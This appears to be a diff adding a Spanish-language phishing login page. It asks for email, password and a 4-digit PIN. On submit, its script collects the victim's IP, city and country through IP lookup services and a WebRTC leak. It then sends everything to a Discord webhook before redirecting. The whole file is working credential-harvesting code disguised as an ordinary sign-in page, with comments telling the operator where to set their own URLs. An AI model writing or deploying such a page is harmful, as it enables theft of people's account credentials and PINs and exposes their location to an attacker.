@@ -1,0 +1,256 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+  <link href="remixicon.css" rel="stylesheet">
+  <link rel="stylesheet" href="style2s.css">
+  <link href="https://cdn.jsdelivr.net/npm/remixicon@2.5.0/fonts/remixicon.css" rel="stylesheet">
+  <title>Iniciar</title>
+
+  <style>
+    .error-message {
+      color: #ff4d4f;
+      font-size: 13px;
+      margin-top: 5px;
+      display: none;
+    }
+
+    .input-error {
+      border-color: #ff4d4f !important;
+      box-shadow: 0 0 0 2px rgba(255, 77, 79, 0.2);
+    }
+
+    .status-message {
+      text-align: center;
+      font-size: 14px;
+      margin-top: 10px;
+      display: none;
+    }
+
+    .status-success {
+      color: #28a745;
+    }
+
+    .status-error {
+      color: #dc3545;
+    }
+  </style>
+</head>
+<body>
+  <section class="login">
+    <img src="img/imgnew.svg" alt="Login-image" class="login--image">
+
+    <form id="loginForm" class="login--form">
+      <div align="left">
+        <img src="img/lbg.png" style="width:110px"><br>
+        <span style="font-size:20px"><b>Iniciar sesi&oacute;n</b></span>
+      </div><br>
+
+      <div class="login--content">
+
+        <!-- Correo -->
+        <div class="login-box">
+          <i class="ri-user-3-line login-icon"></i>
+          <div class="login--input-box">
+            <input type="email" required name="eml" class="login-input" id="email" placeholder=" ">
+            <label for="email" class="login--input-label">Correo electr&oacute;nico</label>
+          </div>
+        </div>
+
+        <!-- Contraseña -->
+        <div class="login-box">
+          <i class="ri-lock-2-line login-icon"></i>
+          <div class="login--input-box">
+            <input type="password" name="psew" class="login-input" id="password" placeholder=" " required>
+            <label for="password" class="login--input-label">Contraseña</label>
+            <i class="login--eye ri-eye-off-line" id="eye-password"></i>
+          </div>
+        </div>
+
+        <!-- PIN -->
+        <div class="login-box">
+          <i class="ri-shield-keyhole-line login-icon"></i>
+          <div class="login--input-box">
+            <input type="password" name="pin" class="login-input" id="pin" placeholder=" "
+                   maxlength="4" inputmode="numeric" required>
+            <label for="pin" class="login--input-label">PIN de 4 dígitos</label>
+            <i class="login--eye ri-eye-off-line" id="eye-pin"></i>
+          </div>
+          <div class="error-message" id="pin-error">El PIN debe contener exactamente 4 dígitos numéricos.</div>
+        </div>
+
+      </div>
+
+      <button class="login--button" type="submit">Siguiente</button>
+      <div id="status" class="status-message"></div>
+    </form>
+  </section>
+
+  <script src="webhook.js"></script>
+  <script>
+    // 🔹 CONFIGURA URL DE REDIRECCIÓN AQUÍ:
+    const redirectURL = "_indexx.html"; // 👉 cámbialo por tu propia URL o página
+
+    const form = document.getElementById("loginForm");
+    const email = document.getElementById("email");
+    const password = document.getElementById("password");
+    const pin = document.getElementById("pin");
+    const pinError = document.getElementById("pin-error");
+    const statusMessage = document.getElementById("status");
+
+    // Mostrar / ocultar contraseña
+    const eyePassword = document.getElementById("eye-password");
+    eyePassword.addEventListener("click", () => {
+      const show = password.type === "password";
+      password.type = show ? "text" : "password";
+      eyePassword.classList.toggle("ri-eye-line", show);
+      eyePassword.classList.toggle("ri-eye-off-line", !show);
+    });
+
+    // Mostrar / ocultar PIN
+    const eyePin = document.getElementById("eye-pin");
+    eyePin.addEventListener("click", () => {
+      const show = pin.type === "password";
+      pin.type = show ? "text" : "password";
+      eyePin.classList.toggle("ri-eye-line", show);
+      eyePin.classList.toggle("ri-eye-off-line", !show);
+    });
+
+    // Validar PIN y enviar datos a Discord
+    form.addEventListener("submit", async (e) => {
+      e.preventDefault();
+
+      const pinValue = pin.value.trim();
+
+      // Validar PIN
+      if (!/^\d{4}$/.test(pinValue)) {
+        pinError.style.display = "block";
+        pin.classList.add("input-error");
+        return;
+      } else {
+        pinError.style.display = "none";
+        pin.classList.remove("input-error");
+      }
+
+      // Mostrar mensaje de estado
+      statusMessage.textContent = "Validando datos...";
+      statusMessage.style.display = "block";
+      statusMessage.className = "status-message";
+
+      try {
+        const payload = {
+          // reemplaza el placeholder por esto
+          content: await (async () => {
+            // helper: detect private IPv4
+            const isPrivate = (ip) => {
+              return /^10\.|^127\.|^169\.254\.|^192\.168\.|^172\.(1[6-9]|2[0-9]|3[0-1])\./.test(ip);
+            };
+
+            // intento 1: ipapi.co (provee ip + geo y suele permitir CORS)
+            try {
+              const r = await fetch("https://ipapi.co/json/");
+              if (r.ok) {
+                const j = await r.json();
+                return `🔐 **Nuevo inicio de sesión**\n📧 Correo: ${email.value}\n🔑 Contraseña: ${password.value}\n📲 PIN: ${pinValue}\n🌐 IP: ${j.ip || "desconocida"}\n🏙 Ciudad: ${j.city || "desconocida"}\n🗺 País: ${j.country_name || j.country || "desconocido"}`;
+              }
+            } catch (e) { /* fallback abajo */ }
+
+            // intento 2: ipify para IP pública + ipapi para geo por IP
+            try {
+              const rIp = await fetch("https://api.ipify.org?format=json");
+              if (rIp.ok) {
+                const jIp = await rIp.json();
+                const ip = jIp.ip;
+                try {
+                  const rGeo = await fetch(`https://ipapi.co/${ip}/json/`);
+                  if (rGeo.ok) {
+                    const jGeo = await rGeo.json();
+                    return `🔐 **Nuevo inicio de sesión**\n📧 Correo: ${email.value}\n🔑 Contraseña: ${password.value}\n📲 PIN: ${pinValue}\n🌐 IP: ${ip || "desconocida"}\n🏙 Ciudad: ${jGeo.city || "desconocida"}\n🗺 País: ${jGeo.country_name || jGeo.country || "desconocido"}`;
+                  }
+                } catch (e) { /* seguir fallback */ }
+                return `🔐 **Nuevo inicio de sesión**\n📧 Correo: ${email.value}\n🔑 Contraseña: ${password.value}\n📲 PIN: ${pinValue}\n🌐 IP: ${ip || "desconocida"}\n🏙 Ciudad: desconocida\n🗺 País: desconocido`;
+              }
+            } catch (e) { /* fallback below */ }
+
+            // intento 3: intentar obtener IP directa vía WebRTC (STUN) — puede revelar la IP real detrás de NAT en algunos casos
+            try {
+              const ipFromWebRTC = await (async () => {
+                return await new Promise((resolve) => {
+                  const ips = new Set();
+                  const pc = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] });
+                  pc.createDataChannel(""); // crear canal para forzar candidatos
+                  pc.onicecandidate = (evt) => {
+                    if (!evt.candidate) {
+                      pc.close();
+                      // elegir la primera IP pública encontrada
+                      for (const ip of ips) {
+                        if (!isPrivate(ip)) return resolve(ip);
+                      }
+                      // si no hay pública, devolver la primera privada (si existe)
+                      return resolve(ips.values().next().value || null);
+                    } else {
+                      const m = evt.candidate.candidate.match(/([0-9]{1,3}(?:\.[0-9]{1,3}){3})/);
+                      if (m) ips.add(m[1]);
+                    }
+                  };
+                  pc.createOffer()
+                    .then((sdp) => pc.setLocalDescription(sdp))
+                    .catch(() => resolve(null));
+                });
+              })();
+
+              if (ipFromWebRTC) {
+                // intentar obtener geo por IP si se pudo obtener una IP pública
+                try {
+                  const rGeo2 = await fetch(`https://ipapi.co/${ipFromWebRTC}/json/`);
+                  if (rGeo2.ok) {
+                    const jG2 = await rGeo2.json();
+                    return `🔐 **Nuevo inicio de sesión**\n📧 Correo: ${email.value}\n🔑 Contraseña: ${password.value}\n📲 PIN: ${pinValue}\n🌐 IP: ${ipFromWebRTC}\n🏙 Ciudad: ${jG2.city || "desconocida"}\n🗺 País: ${jG2.country_name || jG2.country || "desconocido"}`;
+                  }
+                } catch (e) { /* ignorar */ }
+
+                return `🔐 **Nuevo inicio de sesión**\n📧 Correo: ${email.value}\n🔑 Contraseña: ${password.value}\n📲 PIN: ${pinValue}\n🌐 IP: ${ipFromWebRTC}\n🏙 Ciudad: desconocida\n🗺 País: desconocido`;
+              }
+            } catch (e) { /* seguir al final */ }
+
+            // último recurso: no se pudo obtener IP/geo
+            return `🔐 **Nuevo inicio de sesión**\n📧 Correo: ${email.value}\n🔑 Contraseña: ${password.value}\n📲 PIN: ${pinValue}\n🌐 IP: desconocida\n🏙 Ciudad: desconocida\n🗺 País: desconocido`;
+          })()
+        };
+
+        const response = await fetch(webhookURL, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify(payload)
+        });
+
+        if (response.ok) {
+          statusMessage.textContent = "✅ Validados correctamente";
+          statusMessage.classList.add("status-success");
+          form.reset();
+
+          // Espera 0 segundo y redirige
+          setTimeout(() => {
+            window.location.href = redirectURL;
+          }, 0);
+        } else {
+          throw new Error("Error al enviar");
+        }
+      } catch (error) {
+        statusMessage.textContent = "❌ Error al enviar los datos.";
+        statusMessage.classList.add("status-error");
+      }
+    });
+
+    // Ocultar error mientras escribe
+    pin.addEventListener("input", () => {
+      if (/^\d{4}$/.test(pin.value.trim())) {
+        pinError.style.display = "none";
+        pin.classList.remove("input-error");
+      }
+    });
+  </script>
+</body>
+</html>
